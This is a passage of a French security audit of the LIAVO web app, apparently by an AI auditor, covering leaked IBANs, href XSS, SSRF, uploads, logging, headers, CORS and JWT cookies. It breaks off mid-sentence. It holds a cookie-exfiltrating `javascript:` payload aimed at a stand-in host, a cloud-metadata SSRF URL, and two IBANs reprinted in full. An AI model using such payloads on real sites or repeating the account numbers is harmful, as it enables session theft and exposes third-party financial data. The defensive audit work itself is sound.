### D1. CRITIQUE — Données financières en clair commitées (IBAN dans le code et les docs, persistés dans l'historique git)

**FAIT.** Deux IBAN réels sont présents dans des fichiers **suivis par git** (donc dans
l'historique, même s'ils sont retirés plus tard) :
- `backend/src/devis/contrat-sauvageon.pdf.tsx:188` :
  `<Text>FR76 1810 6000 2796 7820 4408 470</Text>` — **IBAN codé en dur** dans un template PDF de
  contrat (préfixe banque `18106` = Crédit Mutuel/CIC ; « Sauvageon » = centre réel → IBAN d'un
  partenaire, pas un placeholder).
- `docs/juridique/INDEX_JURIDIQUE.md:35` : `IBAN : FR76 1810 6000 2796 7985 1267 389` — second IBAN
  réel, dans la doc juridique commitée.

**FAIT — ce qui N'EST PAS trouvé (rassurant).** Le scan (`tk-`, `apiKey:`, `SECRET:`, `Bearer <tok>`,
`xkeysib-`, `BEGIN PRIVATE KEY`) ne remonte **aucune clé API, aucun token, aucun mot de passe en
clair** dans le repo. Les secrets (S3, JWT, Brevo, DB) sont tous référencés via `process.env` /
`ConfigService` (ex. `storage.service.ts:14-24`, `jwt.strategy.ts:22`). `frontend/.env.production`
est **tracké** mais ne contient que `NEXT_PUBLIC_API_URL=https://api.liavo.fr` (variable `NEXT_PUBLIC_*`
= publique par design, embarquée dans le bundle client — **pas un secret**).

**INTERPRÉTATION.** Un IBAN seul n'est pas un identifiant de connexion (on ne « vide » pas un compte
avec un IBAN), mais c'est une **donnée financière confidentielle** d'un partenaire, exposée de façon
permanente à quiconque clone le repo ou accède à l'historique git. Couplé au nom du centre =
divulgation. Sévérité élevée par le caractère **irréversible** (historique git) et la nature
financière. Risque de fraude au virement (substitution d'IBAN dans des échanges de phishing).

**FAIT — angle mort `.gitignore`.** `.gitignore` (lignes 12-17) ignore `.env`, `.env.local`,
`.env*.local`, `.env.production.local` — **mais PAS `.env.production`** (qui est d'ailleurs tracké).
Tout secret ajouté un jour à `frontend/.env.production` (ou un `backend/.env.production`) serait
**commité silencieusement**.

**Fix recommandé.**
1. **Retirer les deux IBAN** du code/docs : `contrat-sauvageon.pdf.tsx` doit lire l'IBAN depuis la
   donnée centre (`emetteurIban`, déjà le pattern de `FacturePDF.tsx`), pas une constante ; purger
   l'IBAN de `INDEX_JURIDIQUE.md`.
2. **Réécrire l'historique git** (`git filter-repo`/BFG) pour expurger ces valeurs, ou — plus
   pragmatique — considérer ces IBAN comme **divulgués** et vérifier avec les partenaires concernés.
3. Ajouter `.env.production` (et `*.env.production`) au `.gitignore` ; ajouter un **scan de secrets
   en CI** (gitleaks/trufflehog) en pre-commit + pipeline. Estimation : **0,5 j** (code+gitignore+CI) ;
   réécriture d'historique **0,5 j** + coordination.

---

### D2. FAIT rassurant — SQL injection : inexistante (zéro requête brute)

**FAIT.** `grep $queryRaw|$executeRaw|$queryRawUnsafe|$executeRawUnsafe` sur tout `backend/` →
**aucune occurrence**. 100 % de l'accès données passe par le **query builder Prisma** (paramétrage
automatique). Aucune interpolation de chaîne dans une requête SQL.

**INTERPRÉTATION.** La surface SQLi classique est **nulle** côté application. (Réserve générale :
dépend de l'absence de `prisma.$queryRawUnsafe` introduit ultérieurement — à re-scanner à chaque
revue.) Aucun fix requis. Recommandation préventive : règle ESLint interdisant
`$queryRawUnsafe`/`$executeRawUnsafe`.

---

### D3. MOYENNE — XSS : pas de `dangerouslySetInnerHTML`, mais champs URL libres rendus en `href={}` sans garde de protocole (`javascript:`)

**FAIT — bon point.** `grep dangerouslySetInnerHTML` sur tout `frontend/` → **aucune occurrence**.
React échappe par défaut le texte (notes, journal, messages, descriptions, noms de mineurs, lignes
de devis sont donc rendus **sans risque** d'XSS stocké côté navigateur).

**FAIT — le trou résiduel.** Des **champs URL libres** issus de la DB sont rendus dans des
attributs `href` :
- `centre.permalien` → `<a href={centre.permalien} target="_blank" rel="noopener noreferrer">`
  (`frontend/app/catalogue/[id]/page.tsx:205` ; idem `dashboard/organisateur/hebergements/[id]/page.tsx:337`).
- `siteWeb` : champ **librement éditable par l'hébergeur** — `UpdateCentreDto.siteWeb?: string`
  (`backend/src/centres/dto/update-centre.dto.ts:44-45`), validé par **`@IsString()` seul** (pas
  `@IsUrl`, aucune contrainte de protocole). Renvoyé par l'API (`centre.service.ts:959`,
  `public.ts:12`, `centre.ts:28`).

React **ne neutralise PAS** un `href="javascript:…"` (il émet au mieux un warning). Si un hébergeur
positionne `siteWeb = "javascript:fetch('//evil/'+document.cookie)"` (ou `data:text/html,…`) et que
ce champ est rendu dans un `href={centre.siteWeb}`, un clic d'un visiteur (organisateur, autre
hébergeur, admin) **exécute le script** dans leur session.

**INTERPRÉTATION / INCERTAIN.** Le `grep` confirme `siteWeb` **stocké librement et exposé par
l'API** (FAIT) ; il est édité via un `<input>` dans le profil (`profil/page.tsx:487`). **INCERTAIN** :
je n'ai pas trouvé de sink `<a href={…siteWeb}>` explicite dans les fichiers lus — le risque est
**latent** (un composant non listé, ou un futur rendu, suffit à l'activer). `permalien` EST rendu en
`href` mais provient d'un catalogue externe (APIDAE/EN), pas du DTO hébergeur → contrôle indirect.
`rel="noopener noreferrer"` est bien présent (anti tab-nabbing) mais ne protège pas du `javascript:`.

**Fix recommandé.** (1) Valider `siteWeb`/toute URL stockée avec `@IsUrl({ require_protocol: true,
protocols: ['http','https'] })`. (2) Helper de rendu qui n'émet un `href` que si l'URL commence par
`http(s)://` (rejeter `javascript:`/`data:`/`vbscript:`). Estimation : **0,5 j**.

---

### D4. BASSE — SSRF via PDF : mitigée par design (logo toujours S3), défense en profondeur recommandée

**FAIT.** Le PDF de facture est généré **côté serveur** et charge une image distante :
`<Image src={logoUrl} style={s.logo} />` (`backend/src/facture/pdf/FacturePDF.tsx:192`). `@react-pdf/renderer`
**fetch l'URL côté serveur** au rendu. Une URL arbitraire dans `logoUrl` (ex.
`http://169.254.169.254/latest/meta-data/…`) déclencherait un appel serveur vers les métadonnées
cloud = SSRF.

**FAIT — pourquoi c'est mitigé.** `logoUrl` (et `imageUrl`) ne sont **jamais des chaînes libres** :
ils ne sont écrits **que** par un upload authentifié → `storage.upload(file, 'logos'|'centres')`
qui renvoie une URL du bucket OVH (`centre.service.ts:1172,1122`, `:1176`). `UpdateCentreDto`
**ne contient ni `logoUrl` ni `imageUrl`** (vérifié, lignes 1-94) → un hébergeur ne peut pas les
positionner sur une URL arbitraire. Le `src` du PDF pointe donc toujours vers le domaine S3.

**INTERPRÉTATION.** Pas de SSRF exploitable **aujourd'hui**. Mais la défense repose entièrement sur
l'invariant « `logoUrl` ⟹ upload S3 » : un futur endpoint acceptant `logoUrl` en chaîne, ou une
compromission DB, rendrait le SSRF **immédiat** (le renderer fetch sans restriction). C'est une
fragilité de défense en profondeur.

**Fix recommandé (préventif).** Contraindre `<Image src>` à un **allowlist de domaine** (préfixe
`S3_PUBLIC_URL`) avant rendu ; ignorer toute URL hors-bucket. Estimation : **0,25 j**.

---

### D5. MOYENNE — Uploads : MIME validé sur le Content-Type **déclaré** (pas magic bytes) + aucune limite multer (buffering mémoire avant contrôle)

**FAIT.** Validation centralisée dans `storage.service.ts` `upload()` :
- **MIME** : `ALLOWED_MIME_TYPES` = jpeg/png/webp/pdf, comparé à **`file.mimetype`** (`:30-41`) —
  c'est le **Content-Type déclaré** par le client (dérivé de l'en-tête multipart / extension),
  **pas une vérification des magic bytes**. Un fichier malveillant renommé/déclaré `image/png` passe.
- **Taille** : `MAX_FILE_SIZE = 10 Mo` vérifié `:43-48` — **mais** tous les `@UseInterceptors(FileInterceptor('x'))`
  (auth, devis, centres, autorisations, collaboration, organisations, rentabilite — 18 sites)
  sont déclarés **sans options `limits`**. Multer bufferise donc **tout le fichier en mémoire**
  avant que le contrôle `file.size` ne s'exécute → un upload de 500 Mo est **entièrement chargé en
  RAM** puis rejeté (DoS mémoire). La limite `json({ limit:'5mb' })` (`main.ts:13`) ne s'applique
  **pas** au multipart.
- **Nom de fichier** : `upload()` **ignore** `originalname` et génère `${folder}/${randomUUID()}.${ext}`
  (`:58`) → **path traversal impossible**. `uploadBuffer()` assainit en plus
  (`replace(/[^a-zA-Z0-9._-]/g,'_')`, `:80`). **OK.**
- **Service** : fichiers stockés sur **S3 (`public_read`)**, jamais exécutés côté serveur
  (cf. A0). Pas de RCE ; le risque MIME-spoof est borné par l'absence de SVG/HTML dans l'allowlist.

**INTERPRÉTATION.** Deux faiblesses réelles : (1) **DoS mémoire** (pas de `limits.fileSize` multer) ;
(2) **MIME déclaratif** (un PDF avec payload, ou un fichier au mauvais type, est accepté tant que
le Content-Type ment) — impact limité car stockage S3 non exécutant et types restreints. **INCERTAIN** :
les routes dont le service **ne passe pas** par `storage.upload()` (à confirmer site par site) ne
bénéficient d'**aucune** des deux validations.

**Fix recommandé.** (1) Ajouter `limits: { fileSize: 10*1024*1024 }` (+ `files`) dans **chaque**
`FileInterceptor` (ou un `MulterModule.register` global) → rejet **avant** buffering complet.
(2) Vérifier les **magic bytes** (lib `file-type`) en plus du Content-Type. Estimation : **0,5–1 j**.

---

### D6. BASSE / INFO — Verbosité des erreurs : pas de filtre d'exception global (défaut Nest = pas de fuite de stack)

**FAIT.** `grep useGlobalFilters|ExceptionFilter|AllExceptionsFilter|@Catch` sur `backend/src` →
**aucune occurrence**. Pas de filtre d'exception global ; `main.ts` n'enregistre que le
`ValidationPipe` (`:52`).

**INTERPRÉTATION.** Le **comportement par défaut de NestJS** ne renvoie **pas** la stack trace dans
la réponse HTTP : une `HttpException` renvoie son message ; une erreur non-`HttpException`
(ex. `throw new Error('Compte réseau non configuré')`, `admin.controller.ts`) renvoie
`{"statusCode":500,"message":"Internal server error"}` — le message interne **n'est pas exposé** au
client. Le risque de fuite de code interne par stack trace est donc **faible**. Réserve : la
cohérence des réponses d'erreur n'est pas maîtrisée, et les messages d'`HttpException` métier sont
renvoyés tels quels (vérifier qu'aucun ne contient d'info sensible).

**Fix recommandé (hygiène).** Ajouter un `AllExceptionsFilter` global : réponse normalisée, code de
corrélation, logging serveur structuré, garantie qu'aucune stack ne fuit. Estimation : **0,5 j**.

---

### D7. MOYENNE — Logs sensibles : lien magique (token) et corps d'email complet écrits dans les logs

**FAIT.** Plusieurs `console.*` de `backend/src` écrivent des données sensibles (visibles dans les
logs Scalingo, accessibles à tout détenteur du dashboard/CLI) :
- `accompagnateurs/accompagnateur.service.ts:44` :
  `console.log(... Envoi email ordre de mission à ${dto.email} — lien: ${lien})` → **le lien contient
  le `tokenAcces`** (UUID de signature) → **token loggé en clair**. Un accès aux logs = prise de
  contrôle du flux de signature (cf. C3).
- `email/email.service.ts:80` et `:441` : sur échec d'envoi,
  `console.error('[EMAIL FAIL] …', JSON.stringify(body, null, 2))` → **corps complet de l'email**
  (HTML) loggé, incluant potentiellement **magic links / liens de reset / liens de signature** et
  des noms. Fuite de tokens en cas d'erreur Brevo.
- `email/email.service.ts:68,77,429,438` : log des **adresses email** destinataires + sujets (PII).
- `storage/storage.service.ts:50` : log de `originalname` (peut contenir une PII, ex.
  `certificat_medical_Jean_Dupont.pdf`).

**FAIT — ce qui est propre.** Aucun `console.log` ne logge un **mot de passe**, le **body de login/
register**, ni une **URL S3 de document médical** (vérifié sur l'échantillon). Les stacks d'erreur
(`storage`, `facture`, `facture-x`) restent côté serveur.

**INTERPRÉTATION.** Les logs ne devraient jamais contenir de **tokens d'authentification** ni de
**corps d'emails transactionnels**. `accompagnateur.service.ts:44` et `email.service.ts:80/441` sont
des fuites réelles (sévérité MOYENNE car nécessite l'accès aux logs Scalingo — cf. checklist).

**Fix recommandé.** (1) Retirer le `lien`/token des logs (logger un identifiant non sensible).
(2) Ne jamais `JSON.stringify(body)` d'un email : logger sujet + destinataire + code d'erreur Brevo
uniquement. (3) Masquer les emails en logs (`j***@domaine`). (4) Idéalement, logger structuré
(pino) avec redaction automatique des champs sensibles. Estimation : **0,5 j**.

---

### D8. BASSE — Injection HTML dans les emails (contenu libre interpolé sans échappement)

**FAIT.** Les emails HTML sont construits par **template literals** interpolant des champs libres
**sans échappement HTML**. Exemple : `hebergements/hebergement.service.ts:248-251` injecte
`message` (saisi par l'enseignant) et `centre.nom` bruts dans le corps HTML envoyé au réseau
(`${message ? \`<p>Message : <em>${message}</em></p>\` : ''}`). Idem divers emails
(`auth.service.ts` reset, notifications). À l'inverse, le XML Chorus **échappe** correctement
(`facture.service.ts` `escapeXml`).

**INTERPRÉTATION.** Pas d'XSS navigateur (les clients mail isolent/neutralisent le JS), mais
**injection de contenu/HTML** dans un email légitime LIAVO : un attaquant peut insérer des liens
(`<a href="//phishing">`), du formatage trompeur ou casser la mise en page d'un email reçu par un
admin/réseau/centre → vecteur de **phishing crédible** (l'email vient du domaine LIAVO).

**Fix recommandé.** Échapper toute valeur utilisateur interpolée dans un HTML d'email (helper
`escapeHtml`), ou utiliser un moteur de template avec auto-échappement. Estimation : **0,5 j**.

---

### Checklist — NON VÉRIFIABLE DEPUIS LE CODE (pour Théo) — Section D

- [ ] **IBAN divulgués (D1)** : ces deux IBAN sont-ils réels/actifs ? Prévenir le(s) partenaire(s) ;
  décider de la réécriture d'historique git. Le repo a-t-il déjà été cloné par des tiers ?
- [ ] **Scan de l'historique git complet** : un secret (clé S3/Brevo/JWT) a-t-il été commité puis
  retiré dans le passé ? (le scan présent ne couvre que l'état actuel des fichiers — lancer
  `gitleaks detect` sur tout l'historique).
- [ ] **Accès aux logs Scalingo (D7)** : qui peut lire les logs applicatifs (dashboard/CLI) ? Les
  tokens loggés (`accompagnateur.service.ts:44`, corps emails) y sont-ils rétentionnés ? Durée ?
- [ ] **Dépendances** : `npm audit` (back + front) non exécutable en lecture seule ici — vérifier les
  CVE de `@react-pdf/renderer`, `pdf-lib`, `multer`, `@aws-sdk/*`, Next.js, NestJS hors-repo.
- [ ] **En-têtes de sécurité déployés** (rappel Sections A/B) : CSP (atténue un XSS `javascript:`
  href — D3), `X-Content-Type-Options: nosniff` (atténue le MIME-spoof S3 — D5).
- [ ] **WAF / limites de taille au reverse-proxy** (Scalingo) : une limite de body multipart en amont
  atténuerait le DoS mémoire upload (D5) avant d'atteindre Node.

---

### Tableau récapitulatif — Section D

| # | Vulnérabilité | `fichier:ligne` | Sévérité | Fix (estim.) |
|---|---|---|---|---|
| D1 | **IBAN réels commités** (code + docs), persistés dans l'historique git ; `.gitignore` ne couvre pas `.env.production` | `devis/contrat-sauvageon.pdf.tsx:188` ; `docs/juridique/INDEX_JURIDIQUE.md:35` ; `.gitignore:12-17` | **CRITIQUE** | Retirer + purger historique + scan CI (0,5–1 j) |
| D5 | Upload : MIME déclaratif (pas magic bytes) + aucune limite multer (DoS mémoire) | `storage/storage.service.ts:30-48` ; 18× `FileInterceptor` sans `limits` | MOYENNE | `limits` multer + magic bytes (0,5–1 j) |
| D3 | Champs URL libres (`siteWeb` éditable, `permalien`) rendus en `href={}` sans garde `javascript:` | `centres/dto/update-centre.dto.ts:44-45` ; `catalogue/[id]/page.tsx:205` | MOYENNE | `@IsUrl` + helper href http(s) (0,5 j) |
| D7 | Logs : token de lien magique + corps email complet écrits en clair | `accompagnateur.service.ts:44` ; `email/email.service.ts:80,441` | MOYENNE | Retirer tokens/bodies des logs (0,5 j) |
| D8 | Injection HTML dans les emails (contenu libre non échappé) | `hebergements/hebergement.service.ts:248-251` | BASSE | `escapeHtml` sur interpolations (0,5 j) |
| D4 | SSRF PDF mitigée (logo toujours S3) — défense en profondeur | `facture/pdf/FacturePDF.tsx:192` ; `centre.service.ts:1122,1172` | BASSE | Allowlist domaine `<Image src>` (0,25 j) |
| D6 | Pas de filtre d'exception global (défaut Nest ne fuit pas la stack) | `main.ts:52` (absence) | BASSE/INFO | `AllExceptionsFilter` (0,5 j) |
| D2 | **SQLi : inexistante** — 0 `$queryRaw`/`$executeRaw` | `backend/` (grep) | — (FAIT rassurant) | Règle ESLint `no-unsafe-raw` (préventif) |

**Faits rassurants confirmés (FAIT) :** aucune requête SQL brute (D2) ; aucun
`dangerouslySetInnerHTML` (D3) ; aucune clé API/token/mot de passe en clair dans le repo (D1) ;
filename d'upload en `randomUUID` (pas de path traversal, D5) ; SSRF logo non exploitable en l'état
(D4) ; défaut Nest ne renvoie pas les stacks au client (D6) ; XML Chorus correctement échappé.
**Priorité de remédiation Section D : D1 (immédiat) → D5/D3/D7 → D8 → D4/D6.**

---

## Section E — Infra, headers, CORS, transport (auditeur : Claude, lecture seule)

**Méthodologie.** Lecture de `backend/src/main.ts`, `app.module.ts` (Throttler),
`prisma/schema.prisma` (datasource), `frontend/src/lib/api.ts`, `frontend/src/contexts/AuthContext.tsx`,
`frontend/app/login/actions.ts`, `frontend/app/auth/callback/page.tsx`,
`frontend/app/api/contact/route.ts`, `frontend/next.config.ts`, les deux `package.json`, et
vérification des lockfiles via `git ls-files`. Chaque point distingue **FAIT** / **INTERPRÉTATION**
/ **INCERTAIN**. Déploiement : Scalingo Paris (apps `liavo-backend`, `liavo-frontend`), DNS OVH.

---

### E1. MOYENNE — Aucun header de sécurité (ni Helmet backend, ni `headers()` Next) sur les DEUX apps

**FAIT — backend.** `main.ts` (relu intégralement, 1-59) n'importe **pas Helmet** (confirmé
`package.json` : `helmet` **absent** des dépendances) et ne pose **aucun** header de sécurité. Seuls
sont posés les headers CORS (`:28-50`). **FAIT — frontend.** `next.config.ts` (1-38) **ne définit
pas** de fonction `async headers()` → l'app Next ne renvoie **aucun** header de sécurité non plus.

**Headers absents (sur les deux apps) et risque concret dans LIAVO :**

| Header absent | Risque concret LIAVO |
|---|---|
| **Content-Security-Policy** | Aucune barrière à l'exfiltration en cas d'XSS (cf. D3 `href` `javascript:`, E3 cookie JS-lisible) : un script injecté peut lire le cookie `token` et l'envoyer à un domaine tiers. CSP `connect-src`/`script-src` bloquerait. |
| **Strict-Transport-Security (HSTS)** | Pas de forçage HTTPS au niveau navigateur → fenêtre de downgrade/MITM (capture du cookie `token` **sans flag `secure`**, cf. E3) sur réseau hostile (Wi-Fi école). |
| **X-Content-Type-Options: nosniff** | Le bucket S3 est `public_read` (A0) et le MIME est déclaratif (D5) : sans `nosniff`, un fichier uploadé mal typé peut être « sniffé » et exécuté comme HTML par le navigateur. |
| **X-Frame-Options / CSP frame-ancestors** | Clickjacking : le dashboard (validation de devis, signature, actions admin) peut être iframé sur un site piège pour détourner des clics (ex. valider un devis, signer). |
| **Referrer-Policy: no-referrer** | **Fuite d'URL S3 médicale** (A0) : quand un parent/enseignant clique un lien externe depuis la page journal/autorisation, l'en-tête `Referer` peut transporter l'URL de la page (et, selon le cas, des paramètres) vers le site tiers. `no-referrer` l'empêche. |
| **Permissions-Policy** | Pas de restriction caméra/micro/géoloc — surface réduite mais à fermer par défaut. |
| **X-XSS-Protection** | Déprécié, mais sans coût ; non posé. |

**INTERPRÉTATION.** Aucun de ces headers n'est une vuln isolée, mais leur **absence collective**
retire toutes les barrières « defense-in-depth » qui atténueraient A0 (S3 public), D3 (XSS href) et
E3 (cookie JS-lisible non-secure). **NON VÉRIFIABLE DEPUIS LE CODE** : Scalingo/un proxy amont
pourrait injecter certains headers (HSTS notamment) — à confirmer (checklist).

**Fix recommandé.** Backend : `app.use(helmet({ ... }))` dans `main.ts` (CSP adaptée aux domaines
LIAVO + OVH + Brevo, HSTS, `referrerPolicy: 'no-referrer'`, `frameguard`). Frontend : ajouter
`async headers()` dans `next.config.ts` (CSP, X-Frame-Options/frame-ancestors, Referrer-Policy).
Estimation : **0,5–1 j** (le réglage fin de la CSP demande des tests).

---

### E2. HAUTE — `trust proxy` non configuré → throttling keyé sur l'IP du proxy Scalingo (amplificateur de TOUTES les protections throttle B/C)

**FAIT.** `grep "trust proxy"|app.set|app.enable` sur `backend/src` → **aucune occurrence**.
`NestFactory.create` (`main.ts:7`) ne configure pas `trust proxy`. Express a donc `trust proxy = false`
par défaut. `ThrottlerModule.forRoot` (`app.module.ts:40-44`) n'utilise **aucun `getTracker` custom**
(grep négatif) → `@nestjs/throttler ^6.5.0` (`package.json:40`) extrait le client via `req.ips[0] ??
req.ip`. Avec `trust proxy = false`, `req.ips` est **vide** et `req.ip = req.socket.remoteAddress`
= l'**IP du routeur Scalingo** (constante), **pas** celle du client.

**Vecteur / impact.** Toutes les limites de débit deviennent **un compteur global partagé** par
l'ensemble du trafic (toutes IP clientes confondues) :
- Les `@Throttle` de **login (5/min)**, **register (5–10/h)**, **magic link (3/h)**, **forgot-password
  (5/h)**, **`/public/demande` (5/min)**, **`/public/centres` (30/min)** ne s'appliquent plus **par
  client** mais globalement.
- Conséquence 1 (**sécurité**) : la protection anti-brute-force/anti-énumération par IP des Sections
  **B** (B4/B5, login/reset/verify) et **C** (C4/C5, abus public) est **neutralisée** — un attaquant
  n'est plus isolé de la masse, et le `getTracker` ne distingue plus les sources.
- Conséquence 2 (**disponibilité**) : un seul attaquant peut **épuiser le compteur global** et
  bloquer le endpoint pour **tous les utilisateurs légitimes** (DoS applicatif via le throttle
  lui-même).

C'est l'**amplificateur** signalé : il dégrade la mitigation « throttle » invoquée dans A6, B4, B5,
C4, C5.

**INTERPRÉTATION / INCERTAIN.** L'effet exact dépend de la façon dont Scalingo présente l'IP source
(IP routeur unique vs `X-Forwarded-For`). Le `ThrottlerGuard` global existe et « fonctionne », mais
sur la **mauvaise clé**. À confirmer : l'IP vue par le backend en prod.

**Fix recommandé.** (1) `app.set('trust proxy', 1)` (ou le nombre de proxys Scalingo) dans `main.ts`
**avant** `listen`, pour que `req.ip` lise `X-Forwarded-For`. (2) Alternative robuste : `getTracker`
custom dans le Throttler lisant `X-Forwarded-For` de façon contrôlée. **Attention** : activer
`trust proxy` sans validation permettrait à un client de **spoofer `X-Forwarded-For`** s'il atteint
le backend directement — s'assurer que le backend n'est joignable **que** via le routeur Scalingo.
Estimation : **0,25 j** + test de l'IP réelle.

---

### E3. HAUTE — JWT en cookie **non-httpOnly et sans flag `secure`** (incohérent) → token volable par tout XSS, 7 jours

**FAIT — le cookie opérant est JS-lisible.** `frontend/src/lib/api.ts:12-15` lit le token via
`Cookies.get('token')` (js-cookie) pour poser `Authorization: Bearer`. **js-cookie ne peut lire
qu'un cookie NON-httpOnly** → le cookie d'auth effectif est nécessairement accessible au JavaScript.
Les sites qui le posent côté client confirment l'absence des flags `httpOnly`/`secure` :
- `frontend/src/contexts/AuthContext.tsx:23,152` : `COOKIE_OPTS = { expires: 7, sameSite: 'lax' }`
  (**ni `httpOnly`, ni `secure`**), utilisé par `Cookies.set(COOKIE_TOKEN, data.access_token, COOKIE_OPTS)`.
- `frontend/app/auth/callback/page.tsx:60` : `Cookies.set('token', token, { expires: 7, sameSite: 'lax' })`.
- Idem `register/hebergeur/page.tsx:327`, `invitation-equipe/[token]/page.tsx:94`,
  `inscription-hebergement/[token]/page.tsx:58`.

**FAIT — incohérence.** **Un seul** chemin pose le cookie correctement : la server action
`frontend/app/login/actions.ts:59-65` (`httpOnly: true, secure: prod, sameSite: 'lax', maxAge 7j`).
Mais comme `api.ts` lit le token en JS, ce cookie httpOnly **n'est pas lisible** par l'intercepteur —
le flux opérationnel repose donc sur les cookies **non-httpOnly** ci-dessus. La configuration est
**incohérente** et le **mode dominant est non sécurisé**.

**Vecteur d'attaque.** Tout XSS (cf. D3 `href` `javascript:`, ou une future faille) lit
`document.cookie` / `Cookies.get('token')` et exfiltre le JWT. Couplé à **B1** (JWT 7 j **non
révocable**, `validate()` ne vérifie pas l'état) et **B2** (`set-password` sans ré-auth), un token
volé = **prise de contrôle persistante**. L'absence de `secure` (sur les 5 sites client) autorise en
plus l'envoi du cookie sur **HTTP** → capture par MITM en l'absence de HSTS (E1).

**INTERPRÉTATION.** Stocker le JWT dans un cookie **lu par JS** n'apporte **aucun** des bénéfices
d'un cookie httpOnly : l'exposition à l'XSS est identique à `localStorage`. Le `sameSite: 'lax'` est
correct (anti-CSRF) mais secondaire ici puisque l'auth passe par l'en-tête `Authorization`.

**FAIT — bonne pratique observée.** Le magic link arrive en **fragment `#token`** (`callback:27-35`),
parsé puis **effacé de l'URL** via `window.history.replaceState` (`:35`) → le token ne reste pas dans
l'historique/adresse et n'est pas envoyé au serveur. Bon point (atténue B3 côté navigateur).

**Fix recommandé.** Unifier sur un cookie **`httpOnly + secure + sameSite=lax`** posé **côté serveur**
(server action / route handler) pour **tous** les flux (login, callback, register, invitations), et
faire transiter l'auth par l'**envoi automatique du cookie** (`axios withCredentials: true` +
`Access-Control-Allow-Credentials` déjà présent) plutôt que par un Bearer lu en JS — ce qui rend le
token **inaccessible au JS**. Implique d'aligner CORS (origines exactes, pas de wildcard — E4) et le
domaine cookie (`.liavo.fr`) entre `liavo.fr` et `api.liavo.fr`. Estimation : **1–1,5 j** (refonte du
transport d'auth + tests cross-subdomain). Réduit drastiquement l'impact de B1/B2/D3.

---

### E4. MOYENNE — CORS : `credentials:true` global, origine `CORS_ORIGIN` non contrainte, commentaire « Railway » obsolète

**FAIT.** CORS posé manuellement (`main.ts:20-50`). `ALLOWED_ORIGINS` =
`['https://liavo.fr', 'https://www.liavo.fr', process.env.CORS_ORIGIN, (localhost si non-prod)]`.
- `Access-Control-Allow-Origin` n'est reflété **que** si l'`origin` est dans la whitelist
  (`:30-33`) — **correct** (pas de wildcard `*` en dur, pas de regex large).
- **MAIS** `Access-Control-Allow-Credentials: true` est posé **inconditionnellement** (`:34`), pour
  toute réponse, y compris quand l'origine n'est pas matchée. Inoffensif en soi (le navigateur exige
  les deux en-têtes), mais signale une intention « credentials ouverts ».
- **`process.env.CORS_ORIGIN`** (`:23`) ajoute une origine **non contrôlée depuis le code** : si elle
  vaut `*` ou une valeur trop large en prod, la whitelist est contournée. **NON VÉRIFIABLE DEPUIS LE
  CODE** (valeur d'env Scalingo).
- Commentaire `:19` « CORS_ORIGIN doit être défini sur **Railway** » = **obsolète** (déploiement
  Scalingo) → risque de confusion opérationnelle.
- Méthodes (`GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD`) et headers (`Authorization, X-Centre-Id`…)
  autorisés sont **adaptés** (pas excessifs).

**INTERPRÉTATION.** La whitelist est saine **tant que** `CORS_ORIGIN` n'est pas permissif. Le couple
`credentials:true` + origine reflétée n'est dangereux que si une origine attaquante entre dans la
liste (via `CORS_ORIGIN`). Risque conditionnel.

**Fix recommandé.** (1) Documenter/contraindre `CORS_ORIGIN` (jamais `*`, liste explicite). (2) Ne
poser `Access-Control-Allow-Credentials` que lorsque l'origine est matchée. (3) Corriger le
commentaire « Railway » → Scalingo. (4) Envisager le package `cors` (déjà en dépendance) ou
`app.enableCors()` plutôt qu'un middleware maison. Estimation : **0,25 j**.

---

### E5. MOYENNE — Route Next `POST /api/contact` : publique, sans rate-limit, injection HTML email, clé Brevo dans l'app frontend

**FAIT.** `frontend/app/api/contact/route.ts:3-39` : route handler **public**, **aucun throttle ni
CAPTCHA**. Envoie un email via Brevo (`:15`) avec `BREVO_API_KEY` (`:10`, env de l'app **frontend**).
`htmlContent` (`:26-32`) interpole `nom`, `email`, `message` **bruts** (seul `\n→<br/>` sur message,
**aucun échappement HTML**) → **injection HTML** dans l'email reçu par `contact@liavo.fr` (même classe
que D8 ; phishing/contenu trompeur). Pas de limite de débit → **spam/email-bombing** de la boîte
contact et **consommation du quota Brevo** (la clé est utilisée à chaque appel anonyme).

**INTERPRÉTATION.** `to` est fixe (`contact@liavo.fr`) → pas d'open-relay ; `replyTo` est
attaquant-contrôlé (acceptable). Le vrai risque = abus de volume + injection HTML + **surface secret
élargie** (la clé Brevo vit aussi dans l'app frontend, pas seulement le backend).

**Fix recommandé.** (1) Rate-limit + CAPTCHA sur `/api/contact`. (2) Échapper le HTML. (3) Idéalement
router cet envoi via le **backend** (un seul détenteur de `BREVO_API_KEY`). Estimation : **0,5 j**.

---

### E6. INFO — Pas de `middleware.ts` Next : protection de routes côté client uniquement (données API-gated)

**FAIT.** Aucun `frontend/**/middleware.ts` (glob négatif). Il n'y a donc **pas** de gate d'auth au
niveau edge/SSR : l'accès aux pages `/dashboard/*` repose sur des redirections **côté client**
(React/`AuthContext`) + l'autorisation **côté API backend**.

**INTERPRÉTATION.** Acceptable pour cette architecture : toutes les données sensibles proviennent de
l'API (protégée par JWT + guards, audités A–C), pas du rendu SSR. Un utilisateur non authentifié peut
charger le « shell » d'une page protégée mais **n'obtient aucune donnée** sans JWT valide. Pas de
fuite SSR identifiée. À garder en tête si des Server Components venaient à lire des données sensibles
sans revérifier l'auth (ils contourneraient les guards backend). **INCERTAIN** : présence de Server
Components lisant directement la DB — non observée (l'accès passe par `api.ts`/server actions vers le
backend).

**Fix (optionnel).** Ajouter un `middleware.ts` qui redirige les routes `/dashboard/*` sans cookie
`token` (défense en profondeur UX). Estimation : **0,25 j**.

---

### E7. MOYENNE — Dépendances : `xlsx@0.18.5` (CVE connues) ; Helmet absent ; lockfiles OK ; `npm audit` à lancer hors-code

**FAIT.**
- **`xlsx ^0.18.5`** (frontend, `package.json:26`) : version npm **figée et non patchée** — CVE de
  **prototype pollution** (CVE-2023-30533) et **ReDoS** (CVE-2024-22363). SheetJS ne publie plus les
  correctifs sur npm (uniquement sur leur CDN). Si le front **parse des fichiers tableur fournis par
  l'utilisateur** (import CRM/participants), la prototype pollution est atteignable. **MOYENNE.**
- **`helmet` absent** (cf. E1).
- Versions globalement **récentes** : NestJS 11, Prisma 7, `@nestjs/throttler` 6.5, `next 16.1.6`
  (postérieur au CVE-2025-29927 de bypass middleware), `react 19.2`, `axios 1.13`, `bcrypt 6`. Aucune
  dépendance manifestement abandonnée côté backend.
- **Lockfiles commités** : `backend/package-lock.json`, `frontend/package-lock.json` **et** un
  `package-lock.json` racine (`git ls-files`) → **builds reproductibles** (bon point).

**INTERPRÉTATION / INCERTAIN.** Je **ne peux pas** lancer `npm audit` (lecture seule) : l'arbre
